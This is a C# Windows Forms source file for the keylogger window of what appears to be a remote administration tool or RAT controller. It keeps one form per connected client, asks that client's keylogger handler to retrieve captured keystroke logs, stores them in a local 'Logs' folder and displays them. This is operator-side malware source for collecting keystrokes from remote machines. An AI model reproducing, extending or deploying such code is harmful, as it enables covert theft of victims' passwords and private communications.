using Server.Extensions;
using Server.Helper;
using Server.Networking;
using Server.Networking.Handlers;

namespace Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();

        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmKeylogger f = new FrmKeylogger(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        private Client _client;
        private readonly KeyloggerHandler _keyloggerHandler;
        private readonly string _baseDownloadPath;

        public FrmKeylogger(Client client)
        {
            _client = client;
            _keyloggerHandler = client.ClientHandler.KeyloggerHandler;
            _keyloggerHandler.Init();

            _baseDownloadPath = Path.Combine(_client.Value.DownloadDirectory, "Logs\\");

            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _client.Disconnected += ClientDisconnected;
            _keyloggerHandler.LogsChanged += LogsChanged;
        }
        private void UnregisterMessageHandler()
        {
            _client.Disconnected -= ClientDisconnected;
            _keyloggerHandler.LogsChanged -= LogsChanged;
        }

        private void ClientDisconnected(Client client)
        {
            this.Invoke((MethodInvoker)this.Close);
        }

        private void LogsChanged(object sender, string message)
        {
            RefreshLogsDirectory();
            btnGetLogs.Invoke(() =>
            {
                btnGetLogs.Enabled = true;
            });
            stripLblStatus.Text = "Status: " + message;
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Keylogger", _client);

            if (!Directory.Exists(_baseDownloadPath))
            {
                Directory.CreateDirectory(_baseDownloadPath);
                return;
            }

            RefreshLogsDirectory();
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            btnGetLogs.Enabled = false;
            stripLblStatus.Text = "Status: Retrieving logs...";
            _keyloggerHandler.RetrieveLogs();
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                wLogViewer.Navigate(Path.Combine(_baseDownloadPath, lstLogs.SelectedItems[0].Text));
            }
        }

        private void RefreshLogsDirectory()
        {
            lstLogs.Invoke(() =>
            {
                lstLogs.Items.Clear();

                DirectoryInfo dicInfo = new DirectoryInfo(_baseDownloadPath);

                FileInfo[] iFiles = dicInfo.GetFiles();

                foreach (FileInfo file in iFiles)
                {
                    lstLogs.Items.Add(new ListViewItem { Text = file.Name });
                }
            });
        }
    }
}
